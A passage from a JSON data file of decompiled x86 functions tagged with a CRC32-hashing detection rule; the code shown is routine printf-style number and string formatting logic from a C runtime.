0x14;\n    fcn.0045592f(&var_ch, piVar7, arg_10h);\n    ppiVar1 = param_1 + 0x448;\n    if (((*(param_1 + 0x1c) >> 3 & 1) != 0) && (((*(param_1 + 0x1c) >> 2 & 1) == 0 && (var_14h = 0,  0 < iVar10)))) {\n        do {\n            var_10h = *ppiVar1;\n            if (var_10h[2] == var_10h[1]) {\n                if (*(var_10h + 3) == '\\0') {\n                    iVar11 = -1;\n                }\n                else {\n                    iVar11 = *arg_10h + 1;\n                }\n                *arg_10h = iVar11;\n            }\n            else {\n                *arg_10h = *arg_10h + 1;\n                var_10h[2] = var_10h[2] + 1;\n                ***ppiVar1 = 0x30;\n                **ppiVar1 = **ppiVar1 + 2;\n            }\n        } while ((*arg_10h != -1) && (var_14h = var_14h + 1,  var_14h < iVar10));\n    }\n    iVar11 = 0;\n    if ((*(param_1 + 0x38) == '\\0') && (0 < *(param_1 + 0x34))) {\n        iVar8 = *(param_1 + 8);\n        if (*(iVar8 + 0x14) == '\\0') {\n            fcn.00453bd0();\n        }\n        iVar9 = *(param_1 + 0x30);\n        var_14h = 0;\n        if (*(param_1 + 0x34) != 0) {\n            do {\n                var_10h = var_10h & 0xffff0000;\n                var_ch = fcn.0045ee07(&var_10h, iVar9, *(*(iVar8 + 0xc) + 4), *(param_1 + 8));\n                ppiVar1 = param_1 + 0x448;\n                if (var_ch < 1) {\n                    *arg_10h = -1;\n                    break;\n                }\n                piVar7 = *ppiVar1;\n                if (piVar7[2] == piVar7[1]) {\n                    if (*(piVar7 + 3) == '\\0') {\n                        *arg_10h = -1;\n                    }\n                    else {\n                        *arg_10h = *arg_10h + 1;\n                    }\n                }\n                else {\n                    *arg_10h = *arg_10h + 1;\n                    piVar7[2] = piVar7[2] + 1;\n                    ***ppiVar1 = var_10h;\n                    **ppiVar1 = **ppiVar1 + 2;\n                }\n                iVar9 = iVar9 + var_ch;\n                var_14h = var_14h + 1;\n            } while (var_14h != *(param_1 + 0x34));\n        }\n    }\n    else {\n        fcn.0045592f(*(param_1 + 0x30), *(param_1 + 0x34), arg_10h);\n    }\n    iVar8 = *arg_10h;\n    if (((-1 < iVar8) && ((*(param_1 + 0x1c) >> 2 & 1) != 0)) && (0 < iVar10)) {\n        do {\n            iVar9 = *(param_1 + 0x448);\n            if (*(iVar9 + 8) == *(iVar9 + 4)) {\n                if (*(iVar9 + 0xc) == '\\0') {\n                    iVar8 = -1;\n                }\n                else {\n                    iVar8 = iVar8 + 1;\n                }\n                *arg_10h = iVar8;\n            }\n            else {\n                *arg_10h = iVar8 + 1;\n                *(iVar9 + 8) = *(iVar9 + 8) + 1;\n                ***(param_1 + 0x448) = 0x20;\n                piVar7 = *(param_1 + 0x448);\n                *piVar7 = *piVar7 + 2;\n            }\n            iVar8 = *arg_10h;\n        } while ((iVar8 != -1) && (iVar11 = iVar11 + 1,  iVar11 < iVar10));\n    }\ncode_r0x0044fb87:\n    fcn.004303e9(unaff_EBX);\n    return;\n}\n",
        "token_count": 2863
    },
    "0044fb96": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.0044fb96(int32_t param_1)\n\n{\n    int32_t *arg_10h;\n    int32_t **ppiVar1;\n    uint16_t uVar2;\n    int16_t iVar3;\n    bool bVar4;\n    bool bVar5;\n    char cVar6;\n    int32_t *piVar7;\n    int32_t iVar8;\n    int32_t iVar9;\n    int32_t iVar10;\n    uint unaff_EBX;\n    int32_t iVar11;\n    ushort uVar12;\n    uint arg_8h;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    int32_t *var_10h;\n    uint32_t var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    var_4h = *0x6cade0 ^ &stack0xfffffffc;\n    uVar2 = *(param_1 + 0x2e);\n    if (uVar2 < 0x65) {\n        if (uVar2 == 100) {\ncode_r0x0044fc56:\n            *(param_1 + 0x1c) = *(param_1 + 0x1c) | 0x10;\ncode_r0x0044fc5a:\n            cVar6 = fcn.00442f03(0);\n        }\n        else if (uVar2 < 0x54) {\n            if (uVar2 == 0x53) {\ncode_r0x0044fc83:\n                cVar6 = fcn.0045334c();\n            }\n            else {\n                if (uVar2 != 0x41) {\n                    if (uVar2 == 0x43) {\ncode_r0x0044fc10:\n                        cVar6 = fcn.004523b4(0);\n                        goto code_r0x0044fc93;\n                    }\n                    if (((uVar2 != 0x45) && (uVar2 != 0x46)) && (uVar2 != 0x47)) goto code_r0x0044ff7b;\n                }\ncode_r0x0044fbef:\n                cVar6 = fcn.00451a4d();\n            }\n        }\n        else if (uVar2 == 0x58) {\n            arg_8h = 1;\ncode_r0x0044fc25:\n            cVar6 = fcn.004441f7(arg_8h);\n        }\n        else {\n            if (uVar2 != 0x5a) {\n                if (uVar2 != 0x61) {\n                    if (uVar2 != 99) goto code_r0x0044ff7b;\n                    goto code_r0x0044fc10;\n                }\n                goto code_r0x0044fbef;\n            }\n            cVar6 = fcn.004507cd();\n        }\n    }\n    else if (uVar2 < 0x70) {\n        if (uVar2 == 0x6f) {\n            cVar6 = fcn.00452d07();\n        }\n        else {\n            if (((uVar2 == 0x65) || (uVar2 == 0x66)) || (uVar2 == 0x67)) goto code_r0x0044fbef;\n            if (uVar2 == 0x69) goto code_r0x0044fc56;\n            if (uVar2 != 0x6e) goto code_r0x0044ff7b;\n            cVar6 = fcn.00452b43();\n        }\n    }\n    else {\n        if (uVar2 != 0x70) {\n            if (uVar2 == 0x73) goto code_r0x0044fc83;\n            if (uVar2 != 0x75) {\n                if (uVar2 != 0x78) goto code_r0x0044ff7b;\n                arg_8h = 0;\n                goto code_r0x0044fc25;\n            }\n            goto code_r0x0044fc5a;\n        }\n        cVar6 = fcn.00452e16();\n    }\ncode_r0x0044fc93:\n    if ((cVar6 == '\\0') || (*(param_1 + 0x2c) != '\\0')) goto code_r0x0044ff7b;\n    var_ch = 0;\n    piVar7 = NULL;\n    var_8h._0_2_ = 0;\n    var_10h = NULL;\n    if ((*(param_1 + 0x1c) >> 4 & 1) != 0) {\n        if ((*(param_1 + 0x1c) >> 6 & 1) == 0) {\n            if ((*(param_1 + 0x1c) & 1) == 0) {\n                if ((*(param_1 + 0x1c) >> 1 & 1) != 0) {\n                    var_ch = 0x20;\n                    piVar7 = 0x1;\n                    var_10h = 0x1;\n                }\n                goto code_r0x0044fcf6;\n            }\n            uVar2 = 0x2b;\n        }\n        else {\n            uVar2 = 0x2d;\n        }\n        var_ch = uVar2;\n        var_10h = 0x1;\n        piVar7 = 0x1;\n    }\ncode_r0x0044fcf6:\n    iVar3 = *(param_1 + 0x2e);\n    if (((iVar3 != 0x78) && (iVar3 != 0x58)) || (bVar4 = true,  (*(param_1 + 0x1c) >> 5 & 1) == 0)) {\n        bVar4 = false;\n    }\n    if ((iVar3 == 0x61) || (bVar5 = false,  iVar3 == 0x41)) {\n        bVar5 = true;\n    }\n    if ((bVar4) || (bVar5)) {\n        *(&var_ch + piVar7 * 2) = 0x30;\n        if ((iVar3 == 0x58) || (uVar12 = 0x78,  iVar3 == 0x41)) {\n            uVar12 = 0x58;\n        }\n        *(&var_ch + piVar7 * 2 + 2) = uVar12;\n        piVar7 = piVar7 + 2;\n        var_10h = piVar7;\n    }\n    iVar10 = (*(param_1 + 0x20) - *(param_1 + 0x34)) - piVar7;\n    if (((*(param_1 + 0x1c) & 0xc) == 0) && (0 < iVar10)) {\n        iVar11 = *(param_1 + 0x14);\n        iVar8 = 0;\n        do {\n            iVar9 = *(param_1 + 0x448);\n            if (*(iVar9 + 8) == *(iVar9 + 4)) {\n                if (*(iVar9 + 0xc) == '\\0') {\n                    iVar11 = -1;\n                }\n                else {\n                    iVar11 = iVar11 + 1;\n                }\n                *(param_1 + 0x14) = iVar11;\n            }\n            else {\n                *(param_1 + 0x14) = iVar11 + 1;\n                *(iVar9 + 8) = *(iVar9 + 8) + 1;\n                ***(param_1 + 0x448) = 0x20;\n                **(param_1 + 0x448) = **(param_1 + 0x448) + 2;\n            }\n            iVar11 = *(param_1 + 0x14);\n            piVar7 = var_10h;\n        } while ((iVar11 != -1) && (iVar8 = iVar8 + 1,  iVar8 < iVar10));\n    }\n    arg_10h = param_1 + 0x14;\n    fcn.0045592f(&var_ch, piVar7, arg_10h);\n    ppiVar1 = param_1 + 0x448;\n    if (((*(param_1 + 0x1c) >> 3 & 1) != 0) && (((*(param_1 + 0x1c) >> 2 & 1) == 0 && (var_14h = 0,  0 < iVar10)))) {\n        do {\n            var_10h = *ppiVar1;\n            if (var_10h[2] == var_10h[1]) {\n                if (*(var_10h + 3) == '\\0') {\n                    iVar11 = -1;\n                }\n                else {\n                    iVar11 = *arg_10h + 1;\n                }\n                *arg_10h = iVar11;\n            }\n            else {\n                *arg_10h = *arg_10h + 1;\n                var_10h[2] = var_10h[2] + 1;\n                ***ppiVar1 = 0x30;\n                **ppiVar1 = **ppiVar1 + 2;\n            }\n        } while ((*arg_10h != -1) && (var_14h = var_14h + 1,  var_14h < iVar10));\n    }\n    iVar11 = 0;\n    if ((*(param_1 + 0x38) == '\\0') && (0 < *(param_1 + 0x34))) {\n        iVar8 = *(param_1 + 8);\n        if (*(iVar8 + 0x14) == '\\0') {\n            fcn.00453bd0();\n        }\n        iVar9 = *(param_1 + 0x30);\n        var_14h = 0;\n        if (*(param_1 + 0x34) != 0) {\n            do {\n                var_10h = var_10h & 0xffff0000;\n                var_ch = fcn.0045ee07(&var_10h, iVar9, *(*(iVar8 + 0xc) + 4), *(param_1 + 8));\n                ppiVar1 = param_1 + 0x448;\n                if (var_ch < 1) {\n                    *arg_10h = -1;\n                    break;\n                }\n                piVar7 = *ppiVar1;\n                if (piVar7[2] == piVar7[1]) {\n                    if (*(piVar7 + 3) == '\\0') {\n                        *arg_10h = -1;\n                    }\n                    else {\n                        *arg_10h = *arg_10h + 1;\n                    }\n                }\n                else {\n                    *arg_10h = *arg_10h + 1;\n                    piVar7[2] = piVar7[2] + 1;\n                    ***ppiVar1 = var_10h;\n                    **ppiVar1 = **ppiVar1 + 2;\n                }\n                iVar9 = iVar9 + var_ch;\n                var_14h = var_14h + 1;\n            } while (var_14h != *(param_1 + 0x34));\n        }\n    }\n    else {\n        fcn.0045592f(*(param_1 + 0x30), *(param_1 + 0x34), arg_10h);\n    }\n    iVar8 = *arg_10h;\n    if (((-1 < iVar8) && ((*(param_1 + 0x1c) >> 2 & 1) != 0)) && (0 < iVar10)) {\n        do {\n            iVar9 = *(param_1 + 0x448);\n            if (*(iVar9 + 8) == *(iVar9 + 4)) {\n                if (*(iVar9 + 0xc) == '\\0') {\n                    iVar8 = -1;\n                }\n                else {\n                    iVar8 = iVar8 + 1;\n                }\n                *arg_10h = iVar8;\n            }\n            else {\n                *arg_10h = iVar8 + 1;\n                *(iVar9 + 8) = *(iVar9 + 8) + 1;\n                ***(param_1 + 0x448) = 0x20;\n                piVar7 = *(param_1 + 0x448);\n                *piVar7 = *piVar7 + 2;\n            }\n            iVar8 = *arg_10h;\n        } while ((iVar8 != -1) && (iVar11 = iVar11 + 1,  iVar11 < iVar10));\n    }\ncode_r0x0044ff7b:\n    fcn.004303e9(unaff_EBX);\n    return;\n}\n",
        "token_count": 2849
    },
    "00450830": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00450830(uint *param_1)\n\n{\n    char *pcVar1;\n    char cVar2;\n    uint *puVar3;\n    uint arg_10h;\n    char *pcVar4;\n    int32_t iVar5;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    param_1[7] = param_1[7] | 0x10;\n    iVar5 = param_1[9];\n    if (iVar5 < 0) {\n        if ((*(param_1 + 0x2d) == 'a') || (*(param_1 + 0x2d) == 'A')) {\n            iVar5 = 0xd;\n        }\n        else {\n            iVar5 = 6;\n        }\n        param_1[9] = iVar5;\n    }\n    else if ((iVar5 == 0) && ((*(param_1 + 0x2d) == 'g' || (*(param_1 + 0x2d) == 'G')))) {\n        param_1[9] = 1;\n        iVar5 = 1;\n    }\n    cVar2 = fcn.0043d5b0(iVar5 + 0x15d, param_1[2]);\n    if (cVar2 == '\\0') {\n        iVar5 = fcn.0043d565();\n        iVar5 = iVar5 + -0x15d;\n        param_1[9] = iVar5;\n    }\n    else {\n        iVar5 = param_1[9];\n    }\n    puVar3 = param_1[0x110];\n    if (param_1[0x110] == NULL) {\n        puVar3 = param_1 + 0xf;\n    }\n    param_1[0xc] = puVar3;\n    puVar3 = param_1[4];\n    param_1[4] = puVar3 + 2;\n    var_14h = *puVar3;\n    var_10h = puVar3[1];\n    var_4h = *(param_1 + 0x2d);\n    var_8h = fcn.0043d565();\n    var_ch = fcn.00440a8f();\n    arg_10h = fcn.0043d565();\n    puVar3 = param_1 + 0xf;\n    if (param_1[0x110] != NULL) {\n        puVar3 = param_1[0x110];\n    }\n    fcn.0045e9cc(&var_14h, puVar3, arg_10h, var_ch, var_8h, var_4h, iVar5, *param_1, param_1[1], 1, param_1[2]);\n    if (((param_1[7] >> 5 & 1) != 0) && (param_1[9] == 0)) {\n        iVar5 = param_1[2];\n        if (*(iVar5 + 0x14) == '\\0') {\n            fcn.00453bd0();\n        }\n        fcn.00447e6c(param_1[0xc], iVar5 + 0xc);\n    }\n    if (((*(param_1 + 0x2d) == 'g') || (*(param_1 + 0x2d) == 'G')) && ((param_1[7] >> 5 & 1) == 0)) {\n        iVar5 = param_1[2];\n        if (*(iVar5 + 0x14) == '\\0') {\n            fcn.00453bd0();\n        }\n        fcn.00447b34(param_1[0xc], iVar5 + 0xc);\n    }\n    pcVar4 = param_1[0xc];\n    cVar2 = *pcVar4;\n    if (cVar2 == '-') {\n        param_1[7] = param_1[7] | 0x40;\n        pcVar4 = pcVar4 + 1;\n        param_1[0xc] = pcVar4;\n        cVar2 = *pcVar4;\n    }\n    if (((cVar2 == 'i') || (cVar2 == 'I')) || ((cVar2 == 'n' || (cVar2 == 'N')))) {\n        param_1[7] = param_1[7] & 0xfffffff7;\n        *(param_1 + 0x2d) = 0x73;\n    }\n    pcVar1 = pcVar4 + 1;\n    do {\n        cVar2 = *pcVar4;\n        pcVar4 = pcVar4 + 1;\n    } while (cVar2 != '\\0');\n    param_1[0xd] = pcVar4 - pcVar1;\n    return 1;\n}\n",
        "token_count": 1078
    },
    "004509c1": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint __fastcall fcn.004509c1(uint *param_1)\n\n{\n    char *pcVar1;\n    char cVar2;\n    uint *puVar3;\n    uint uVar4;\n    char *pcVar5;\n    int32_t iVar6;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    param_1[7] = param_1[7] | 0x10;\n    cVar2 = fcn.00454a93();\n    if (cVar2 == '\\0') {\ncode_r0x00450b69:\n        uVar4 = 0;\n    }\n    else {\n        cVar2 = fcn.0044ac12();\n        if (cVar2 != '\\0') {\n            iVar6 = param_1[9];\n            if (iVar6 < 0) {\n                if ((*(param_1 + 0x2d) == 'a') || (*(param_1 + 0x2d) == 'A')) {\n                    iVar6 = 0xd;\n                }\n                else {\n                    iVar6 = 6;\n                }\n                param_1[9] = iVar6;\n            }\n            else if ((iVar6 == 0) && ((*(param_1 + 0x2d) == 'g' || (*(param_1 + 0x2d) == 'G')))) {\n                param_1[9] = 1;\n                iVar6 = 1;\n            }\n            cVar2 = fcn.0043d5b0(iVar6 + 0x15d, param_1[2]);\n            if (cVar2 == '\\0') {\n                iVar6 = fcn.0043d565();\n                param_1[9] = iVar6 + -0x15d;\n            }\n            puVar3 = param_1[0x110];\n            if (param_1[0x110] == NULL) {\n                puVar3 = param_1 + 0xf;\n            }\n            var_10h = 0;\n            var_ch = 0;\n            param_1[0xc] = puVar3;\n            cVar2 = fcn.0043f167(&var_10h);\n            if (cVar2 == '\\0') goto code_r0x00450b69;\n            cVar2 = *(param_1 + 0x2d);\n            var_4h = fcn.0043d565();\n            var_8h = fcn.00440a8f();\n            uVar4 = fcn.0043d565();\n            puVar3 = param_1 + 0xf;\n            if (param_1[0x110] != NULL) {\n                puVar3 = param_1[0x110];\n            }\n            fcn.0045e9cc(&var_10h, puVar3, uVar4, var_8h, var_4h, cVar2, param_1[9], *param_1, param_1[1], 1, param_1[2]\n                        );\n            if (((param_1[7] >> 5 & 1) != 0) && (param_1[9] == 0)) {\n                iVar6 = param_1[2];\n                if (*(iVar6 + 0x14) == '\\0') {\n                    fcn.00453bd0();\n                }\n                fcn.00447e6c(param_1[0xc], iVar6 + 0xc);\n            }\n            if (((*(param_1 + 0x2d) == 'g') || (*(param_1 + 0x2d) == 'G')) && ((param_1[7] >> 5 & 1) == 0)) {\n                iVar6 = param_1[2];\n                if (*(iVar6 + 0x14) == '\\0') {\n                    fcn.00453bd0();\n                }\n                fcn.00447b34(param_1[0xc], iVar6 + 0xc);\n            }\n            pcVar5 = param_1[0xc];\n            cVar2 = *pcVar5;\n            if (cVar2 == '-') {\n                param_1[7] = param_1[7] | 0x40;\n                pcVar5 = pcVar5 + 1;\n                param_1[0xc] = pcVar5;\n                cVar2 = *pcVar5;\n            }\n            if (((cVar2 == 'i') || (cVar2 == 'I')) || ((cVar2 == 'n' || (cVar2 == 'N')))) {\n                param_1[7] = param_1[7] & 0xfffffff7;\n                *(param_1 + 0x2d) = 0x73;\n            }\n            pcVar1 = pcVar5 + 1;\n            do {\n                cVar2 = *pcVar5;\n                pcVar5 = pcVar5 + 1;\n            } while (cVar2 != '\\0');\n            param_1[0xd] = pcVar5 - pcVar1;\n        }\n        uVar4 = 1;\n    }\n    return uVar4;\n}\n",
        "token_count": 1140
    },
    "00450b6f": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00450b6f(uint *param_1)\n\n{\n    char *pcVar1;\n    char cVar2;\n    uint *puVar3;\n    uint arg_10h;\n    char *pcVar4;\n    int32_t iVar5;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    param_1[7] = param_1[7] | 0x10;\n    iVar5 = param_1[9];\n    if (iVar5 < 0) {\n        if ((*(param_1 + 0x2d) == 'a') || (*(param_1 + 0x2d) == 'A')) {\n            iVar5 = 0xd;\n        }\n        else {\n            iVar5 = 6;\n        }\n        param_1[9] = iVar5;\n    }\n    else if ((iVar5 == 0) && ((*(param_1 + 0x2d) == 'g' || (*(param_1 + 0x2d) == 'G')))) {\n        param_1[9] = 1;\n        iVar5 = 1;\n    }\n    cVar2 = fcn.0043d5b0(iVar5 + 0x15d, param_1[2]);\n    if (cVar2 == '\\0') {\n        iVar5 = fcn.0043d565();\n        iVar5 = iVar5 + -0x15d;\n        param_1[9] = iVar5;\n    }\n    else {\n        iVar5 = param_1[9];\n    }\n    puVar3 = param_1[0x110];\n    if (param_1[0x110] == NULL) {\n        puVar3 = param_1 + 0xf;\n    }\n    param_1[0xc] = puVar3;\n    puVar3 = param_1[4];\n    param_1[4] = puVar3 + 2;\n    var_14h = *puVar3;\n    var_10h = puVar3[1];\n    var_4h = *(param_1 + 0x2d);\n    var_8h = fcn.0043d565();\n    var_ch = fcn.00440a8f();\n    arg_10h = fcn.0043d565();\n    puVar3 = param_1 + 0xf;\n    if (param_1[0x110] != NULL) {\n        puVar3 = param_1[0x110];\n    }\n    fcn.0045e9cc(&var_14h, puVar3, arg_10h, var_ch, var_8h, var_4h, iVar5, *param_1, param_1[1], 1, param_1[2]);\n    if (((param_1[7] >> 5 & 1) != 0) && (param_1[9] == 0)) {\n        iVar5 = param_1[2];\n        if (*(iVar5 + 0x14) == '\\0') {\n            fcn.00453bd0();\n        }\n        fcn.00447e6c(param_1[0xc], iVar5 + 0xc);\n    }\n    if (((*(param_1 + 0x2d) == 'g') || (*(param_1 + 0x2d) == 'G')) && ((param_1[7] >> 5 & 1) == 0)) {\n        iVar5 = param_1[2];\n        if (*(iVar5 + 0x14) == '\\0') {\n            fcn.00453bd0();\n        }\n        fcn.00447b34(param_1[0xc], iVar5 + 0xc);\n    }\n    pcVar4 = param_1[0xc];\n    cVar2 = *pcVar4;\n    if (cVar2 == '-') {\n        param_1[7] = param_1[7] | 0x40;\n        pcVar4 = pcVar4 + 1;\n        param_1[0xc] = pcVar4;\n        cVar2 = *pcVar4;\n    }\n    if (((cVar2 == 'i') || (cVar2 == 'I')) || ((cVar2 == 'n' || (cVar2 == 'N')))) {\n        param_1[7] = param_1[7] & 0xfffffff7;\n        *(param_1 + 0x2d) = 0x73;\n    }\n    pcVar1 = pcVar4 + 1;\n    do {\n        cVar2 = *pcVar4;\n        pcVar4 = pcVar4 + 1;\n    } while (cVar2 != '\\0');\n    param_1[0xd] = pcVar4 - pcVar1;\n    return 1;\n}\n",
        "token_count": 1080
    },
    "00450d00": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00450d00(uint *param_1)\n\n{\n    char *pcVar1;\n    char cVar2;\n    uint *puVar3;\n    uint arg_10h;\n    char *pcVar4;\n    int32_t iVar5;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    param_1[7] = param_1[7] | 0x10;\n    iVar5 = param_1[9];\n    if (iVar5 < 0) {\n        if ((*(param_1 + 0x2d) == 'a') || (*(param_1 + 0x2d) == 'A')) {\n            iVar5 = 0xd;\n        }\n        else {\n            iVar5 = 6;\n        }\n        param_1[9] = iVar5;\n    }\n    else if ((iVar5 == 0) && ((*(param_1 + 0x2d) == 'g' || (*(param_1 + 0x2d) == 'G')))) {\n        param_1[9] = 1;\n        iVar5 = 1;\n    }\n    cVar2 = fcn.0043d5b0(iVar5 + 0x15d, param_1[2]);\n    if (cVar2 == '\\0') {\n        iVar5 = fcn.0043d565();\n        iVar5 = iVar5 + -0x15d;\n        param_1[9] = iVar5;\n    }\n    else {\n        iVar5 = param_1[9];\n    }\n    puVar3 = param_1[0x110];\n    if (param_1[0x110] == NULL) {\n        puVar3 = param_1 + 0xf;\n    }\n    param_1[0xc] = puVar3;\n    puVar3 = param_1[4];\n    param_1[4] = puVar3 + 2;\n    var_14h = *puVar3;\n    var_10h = puVar3[1];\n    var_4h = *(param_1 + 0x2d);\n    var_8h = fcn.0043d565();\n    var_ch = fcn.00440a8f();\n    arg_10h = fcn.0043d565();\n    puVar3 = param_1 + 0xf;\n    if (param_1[0x110] != NULL) {\n        puVar3 = param_1[0x110];\n    }\n    fcn.0045e9cc(&var_14h, puVar3, arg_10h, var_ch, var_8h, var_4h, iVar5, *param_1, param_1[1], 1, param_1[2]);\n    if (((param_1[7] >> 5 & 1) != 0) && (param_1[9] == 0)) {\n        iVar5 = param_1[2];\n        if (*(iVar5 + 0x14) == '\\0') {\n            fcn.00453bd0();\n        }\n        fcn.00447e6c(param_1[0xc], iVar5 + 0xc);\n    }\n    if (((*(param_1 + 0x2d) == 'g') || (*(param_1 + 0x2d) == 'G')) && ((param_1[7] >> 5 & 1) == 0)) {\n        iVar5 = param_1[2];\n        if (*(iVar5 + 0x14) == '\\0') {\n            fcn.00453bd0();\n        }\n        fcn.00447b34(param_1[0xc], iVar5 + 0xc);\n    }\n    pcVar4 = param_1[0xc];\n    cVar2 = *pcVar4;\n    if (cVar2 == '-') {\n        param_1[7] = param_1[7] | 0x40;\n        pcVar4 = pcVar4 + 1;\n        param_1[0xc] = pcVar4;\n        cVar2 = *pcVar4;\n    }\n    if (((cVar2 == 'i') || (cVar2 == 'I')) || ((cVar2 == 'n' || (cVar2 == 'N')))) {\n        param_1[7] = param_1[7] & 0xfffffff7;\n        *(param_1 + 0x2d) = 0x73;\n    }\n    pcVar1 = pcVar4 + 1;\n    do {\n        cVar2 = *pcVar4;\n        pcVar4 = pcVar4 + 1;\n    } while (cVar2 != '\\0');\n    param_1[0xd] = pcVar4 - pcVar1;\n    return 1;\n}\n",
        "token_count": 1079
    },
    "00450e91": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00450e91(uint *param_1)\n\n{\n    char *pcVar1;\n    char cVar2;\n    uint *puVar3;\n    uint uVar4;\n    char *pcVar5;\n    int32_t iVar6;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    param_1[7] = param_1[7] | 0x10;\n    cVar2 = fcn.00454af2();\n    if (cVar2 == '\\0') {\ncode_r0x00451039:\n        uVar4 = 0;\n    }\n    else {\n        cVar2 = fcn.0044ac28();\n        if (cVar2 != '\\0') {\n            iVar6 = param_1[9];\n            if (iVar6 < 0) {\n                if ((*(param_1 + 0x2d) == 'a') || (*(param_1 + 0x2d) == 'A')) {\n                    iVar6 = 0xd;\n                }\n                else {\n                    iVar6 = 6;\n                }\n                param_1[9] = iVar6;\n            }\n            else if ((iVar6 == 0) && ((*(param_1 + 0x2d) == 'g' || (*(param_1 + 0x2d) == 'G')))) {\n                param_1[9] = 1;\n                iVar6 = 1;\n            }\n            cVar2 = fcn.0043d5b0(iVar6 + 0x15d, param_1[2]);\n            if (cVar2 == '\\0') {\n                iVar6 = fcn.0043d565();\n                param_1[9] = iVar6 + -0x15d;\n            }\n            puVar3 = param_1[0x110];\n            if (param_1[0x110] == NULL) {\n                puVar3 = param_1 + 0xf;\n            }\n            var_10h = 0;\n            var_ch = 0;\n            param_1[0xc] = puVar3;\n            cVar2 = fcn.0043f1fd(&var_10h);\n            if (cVar2 == '\\0') goto code_r0x00451039;\n            cVar2 = *(param_1 + 0x2d);\n            var_4h = fcn.0043d565();\n            var_8h = fcn.00440a8f();\n            uVar4 = fcn.0043d565();\n            puVar3 = param_1 + 0xf;\n            if (param_1[0x110] != NULL) {\n                puVar3 = param_1[0x110];\n            }\n            fcn.0045e9cc(&var_10h, puVar3, uVar4, var_8h, var_4h, cVar2, param_1[9], *param_1, param_1[1], 1, param_1[2]\n                        );\n            if (((param_1[7] >> 5 & 1) != 0) && (param_1[9] == 0)) {\n                iVar6 = param_1[2];\n                if (*(iVar6 + 0x14) == '\\0') {\n                    fcn.00453bd0();\n                }\n                fcn.00447e6c(param_1[0xc], iVar6 + 0xc);\n            }\n            if (((*(param_1 + 0x2d) == 'g') || (*(param_1 + 0x2d) == 'G')) && ((param_1[7] >> 5 & 1) == 0)) {\n                iVar6 = param_1[2];\n                if (*(iVar6 + 0x14) == '\\0') {\n                    fcn.00453bd0();\n                }\n                fcn.00447b34(param_1[0xc], iVar6 + 0xc);\n            }\n            pcVar5 = param_1[0xc];\n            cVar2 = *pcVar5;\n            if (cVar2 == '-') {\n                param_1[7] = param_1[7] | 0x40;\n                pcVar5 = pcVar5 + 1;\n                param_1[0xc] = pcVar5;\n                cVar2 = *pcVar5;\n            }\n            if (((cVar2 == 'i') || (cVar2 == 'I')) || ((cVar2 == 'n' || (cVar2 == 'N')))) {\n                param_1[7] = param_1[7] & 0xfffffff7;\n                *(param_1 + 0x2d) = 0x73;\n            }\n            pcVar1 = pcVar5 + 1;\n            do {\n                cVar2 = *pcVar5;\n                pcVar5 = pcVar5 + 1;\n            } while (cVar2 != '\\0');\n            param_1[0xd] = pcVar5 - pcVar1;\n        }\n        uVar4 = 1;\n    }\n    return uVar4;\n}\n",
        "token_count": 1139
    },
    "0045103f": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0045103f(uint *param_1)\n\n{\n    char *pcVar1;\n    char cVar2;\n    uint *puVar3;\n    uint arg_10h;\n    char *pcVar4;\n    int32_t iVar5;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    param_1[7] = param_1[7] | 0x10;\n    iVar5 = param_1[9];\n    if (iVar5 < 0) {\n        if ((*(param_1 + 0x2d) == 'a') || (*(param_1 + 0x2d) == 'A')) {\n            iVar5 = 0xd;\n        }\n        else {\n            iVar5 = 6;\n        }\n        param_1[9] = iVar5;\n    }\n    else if ((iVar5 == 0) && ((*(param_1 + 0x2d) == 'g' || (*(param_1 + 0x2d) == 'G')))) {\n        param_1[9] = 1;\n        iVar5 = 1;\n    }\n    cVar2 = fcn.0043d5b0(iVar5 + 0x15d, param_1[2]);\n    if (cVar2 == '\\0') {\n        iVar5 = fcn.0043d565();\n        iVar5 = iVar5 + -0x15d;\n        param_1[9] = iVar5;\n    }\n    else {\n        iVar5 = param_1[9];\n    }\n    puVar3 = param_1[0x110];\n    if (param_1[0x110] == NULL) {\n        puVar3 = param_1 + 0xf;\n    }\n    param_1[0xc] = puVar3;\n    puVar3 = param_1[4];\n    param_1[4] = puVar3 + 2;\n    var_14h = *puVar3;\n    var_10h = puVar3[1];\n    var_4h = *(param_1 + 0x2d);\n    var_8h = fcn.0043d565();\n    var_ch = fcn.00440a8f();\n    arg_10h = fcn.0043d565();\n    puVar3 = param_1 + 0xf;\n    if (param_1[0x110] != NULL) {\n        puVar3 = param_1[0x110];\n    }\n    fcn.0045e9cc(&var_14h, puVar3, arg_10h, var_ch, var_8h, var_4h, iVar5, *param_1, param_1[1], 1, param_1[2]);\n    if (((param_1[7] >> 5 & 1) != 0) && (param_1[9] == 0)) {\n        iVar5 = param_1[2];\n        if (*(iVar5 + 0x14) == '\\0') {\n            